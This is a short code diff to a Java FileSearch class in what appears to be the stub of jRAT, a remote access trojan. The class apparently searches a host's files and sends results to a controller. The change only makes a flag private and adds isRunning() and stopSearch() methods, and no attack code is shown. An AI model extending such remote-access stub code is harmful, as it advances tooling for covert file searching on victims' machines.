@@ -7,7 +7,7 @@ import se.jrat.stub.packets.outgoing.Packet37SearchResult;
 
 public class FileSearch extends Thread {
 
-	public static boolean running;
+	private static boolean running;
 
 	private Connection con;
 	private String start;
@@ -47,6 +47,17 @@ public class FileSearch extends Thread {
 			}
 		}
 
+	}
+	
+	public static boolean isRunning() {
+		return running;
+	}
+	
+	/**
+	 * Will quickly halt searching in case of interrupted connection etc
+	 */
+	public static void stopSearch() {
+		running = false;
 	}
 
 }
